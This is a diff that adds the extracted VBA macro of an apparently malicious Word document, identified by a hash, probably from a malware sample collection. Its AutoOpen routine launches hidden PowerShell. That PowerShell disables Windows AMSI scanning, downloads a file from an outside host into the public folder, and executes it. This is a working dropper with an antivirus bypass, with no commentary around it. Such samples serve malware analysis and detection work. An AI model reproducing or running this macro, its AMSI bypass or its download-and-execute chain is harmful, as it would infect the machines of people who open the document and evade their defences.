@@ -1,0 +1,20 @@
+Filename     : ./macros/27688e9f26ecbf9926e8632725e375d76557bf380a8c62b2cca8ebad6e7ede59
+OLE stream   : Macros/VBA/ThisDocument
+VBA filename : ThisDocument.cls
+----------------------------------------
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+
+
+Sub AutoOpen()
+    Dim aaa
+    Set aaa = CreateObject("WScript.Shell")
+    aaa.Run "powershell.exe -WindowStyle Hidden -noprofile [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true);If (test-path $env:public + '\aaa.html') {Remove-Item $env:public + '\aaa.html'};$UZYAM = New-Object System.Net.WebClient;$UZYAM.Headers['User-Agent'] = 'UZYAM';$UZYAM.DownloadFile('http://eastmonto123.cafe24.com/index.html', $env:public + '\aaa.html');(New-Object -com Shell.Application).ShellExecute($env:public + '\aaa.html');"
+End Sub
+
